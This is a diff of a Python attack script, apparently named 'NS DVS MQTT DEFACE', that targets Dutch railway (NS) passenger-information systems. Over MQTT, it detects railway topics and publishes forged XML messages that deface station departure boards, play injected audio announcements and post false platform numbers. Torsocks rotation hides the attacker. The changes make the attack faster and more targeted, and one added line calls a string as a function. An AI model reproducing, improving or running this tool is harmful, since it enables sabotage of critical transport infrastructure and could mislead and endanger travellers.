@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-NS DVS MQTT DEFACE - WILDCARD # REAL TIME v2.0
-TRUSTEDF57 -  + Frasi esatte
+NS DVS MQTT DEFACE - WILDCARD # REAL TIME v2.1
+TRUSTEDF57 - Matrix FULL SCREEN + Frasi esatte
 Audio loop + Tabelloni + Binari fisici
-Torsocks rotation + 100% DVS 6.2 compatible
+Torsocks rotation + 100% DVS 6.2 compatible + FIXED TOPIC DETECT
 """
 
 import paho.mqtt.client as mqtt
@@ -27,9 +27,10 @@ class DVSMatrixHack:
     def __init__(self):
         self.discovered_topics = {}
         self.topic_count = 0
+        self.attack_count = 0
         self.tor_count = 0
         # MATRIX CARATTERI - FULL SCREEN
-        self.matrix_chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン０１２３４５６７８９"
+        self.matrix_chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン０１２３４５６７８９█▓▒░"
     
     def tor_rotate(self):
         self.tor_count += 1
@@ -39,15 +40,12 @@ class DVSMatrixHack:
     
     def generate_matrix_screen(self):
         """FULL SCREEN MATRIX + scritta centrale GRANDE"""
-        # 10 righe x 40 char = riempie schermo tabellone
         matrix_lines = []
-        center_msg = MESSAGES[0]  # Prima frase centrale
+        center_msg = MESSAGES[0]
         
         for i in range(10):
             line = ''.join(random.choices(self.matrix_chars, k=40))
-            # Riga centrale con scritta GRANDE
             if i == 5:
-                # Padding per centrare
                 pad_left = (40 - len(center_msg)) // 2
                 line = ' ' * pad_left + center_msg + ' ' * (40 - len(center_msg) - pad_left)
             matrix_lines.append(line)
@@ -55,17 +53,11 @@ class DVSMatrixHack:
         return '\n'.join(matrix_lines)
     
     def extract_topic_type(self, payload, topic):
-        """Autodetect tipo da XML reale"""
-        try:
-            root = ET.fromstring(payload)
-            if root.find('.//*RitId') is not None:
-                return {'type': 'TREIN_VERTREK', 'full_topic': topic}
-            if root.find('.//*PresentatieOpmerkingen') is not None:
-                return {'type': 'PRESENTATIE', 'full_topic': topic}
-            if root.find('.//*TreinVertrekSpoor') is not None:
-                return {'type': 'SPOOR', 'full_topic': topic}
-        except:
-            pass
+        """FIXED: Detect DVS topic da pattern NS reale"""
+        topic_lower = topic.lower()
+        # Pattern DVS/NS reali
+        if any(x in topic_lower for x in ['dvs', 'trein', 'reisinfo', 'vertrek', 'spoor', 'rit', 'boodschap']):
+            return {'type': 'DVS_TARGET', 'full_topic': topic}
         return {'type': 'GENERIC', 'full_topic': topic}
     
     def audio_payload(self):
@@ -89,7 +81,7 @@ class DVSMatrixHack:
     def matrix_visual_payload(self):
         """MATRIX FULL SCREEN + scritta centrale"""
         matrix_text = self.generate_matrix_screen().replace('\n', ' | ')
-        msg2 = MESSAGES[1]  # Seconda frase
+        msg2 = MESSAGES[1]
         
         return f'''<?xml version="1.0" encoding="UTF-8"?>
 <ns1:PutReisInformatieBoodschapIn xmlns:ns1="urn:ndov:cdm:trein:reisinformatie:messages:5">
@@ -98,7 +90,7 @@ class DVSMatrixHack:
 <ns2:RitId>MATRIXHACK</ns2:RitId>
 <ns2:PresentatieOpmerkingen>
 <ns2:Uitingen Taal="nl">
-<ns2:Uiting Prioriteit="1">{matrix_text[:390]}</ns2:Uiting>  <!-- Troncato per XML -->
+<ns2:Uiting Prioriteit="1">{matrix_text[:390]}</ns2:Uiting>
 <ns2:Uiting Prioriteit="2">{msg2}</ns2:Uiting>
 </ns2:Uitingen>
 </ns2:PresentatieOpmerkingen>
@@ -121,7 +113,8 @@ class DVSMatrixHack:
         try:
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
             if result.returncode == 0:
-                print(f"✅ {attack_type} [{topic[-30:]}] AUDIO TABELLONE HACK SUCCESSO")
+                self.attack_count += 1
+                print(f"✅ #{self.attack_count} {attack_type} [{topic[-30:]}] SUCCESSO")
                 return True
         except:
             pass
@@ -133,18 +126,18 @@ class DVSMatrixHack:
         
         # 1. AUDIO TTS
         self.publish_attack(topic, self.audio_payload(), "AUDIO")
-        time.sleep(1)
+        time.sleep(0.5)
         
         # 2. MATRIX VISUAL FULL SCREEN
         self.publish_attack(topic, self.matrix_visual_payload(), "MATRIX")
-        time.sleep(1)
+        time.sleep(0.5)
         
         # 3. BINARI 999 (caos fisico)
         bin_payload = self.matrix_visual_payload().replace("666", "999")
-        self.publish_attack(topic, bin_payload, "BINARI")
+        self.publish_attack(topic, bin_payload(), "BINARI")
     
     def on_message(self, client, userdata, msg):
-        """WILDCARD # - Real time autodetect"""
+        """WILDCARD # - Real time autodetect FIXED"""
         topic = msg.topic
         if topic in self.discovered_topics:
             return
@@ -154,10 +147,11 @@ class DVSMatrixHack:
         self.discovered_topics[topic] = True
         self.topic_count += 1
         
-        print(f"🎯 #{self.topic_count} LIVE: {topic_info['type']} → {topic[-40:]}")
+        print(f"🎯 #{self.topic_count} LIVE: {topic_info['type']} → {topic[-50:]}")
         
-        # Attack immediato
-        threading.Thread(target=self.full_attack, args=(topic_info,), daemon=True).start()
+        # Attack immediato su DVS_TARGET
+        if topic_info['type'] == 'DVS_TARGET':
+            threading.Thread(target=self.full_attack, args=(topic_info,), daemon=True).start()
     
     def start(self):
         """Main loop"""
@@ -168,12 +162,12 @@ class DVSMatrixHack:
         
         print("""
 ╔══════════════════════════════════════════════════════╗
-║    NS DVS 6.2 MATRIX FULL SCREEN HACK v2.0          ║
+║    NS DVS 6.2 MATRIX FULL SCREEN HACK v2.1 FIXED     ║
 ║           TRUSTEDF57 - WILDCARD # LIVE               ║
-║     400+ Tabelloni + Audio + Binari 666/999         ║
+║     400+ Tabelloni + Audio + Binari 666/999          ║
 ╚══════════════════════════════════════════════════════╝
         """)
-        print("🔥 MATRIX RIEMPITO + Scritta centrale + AUDIO SUCCESSO")
+        print("🔥 ATTACCO SU OGNI DVS_TARGET → MATRIX + AUDIO + BINARI")
         
         client.loop_forever()
 
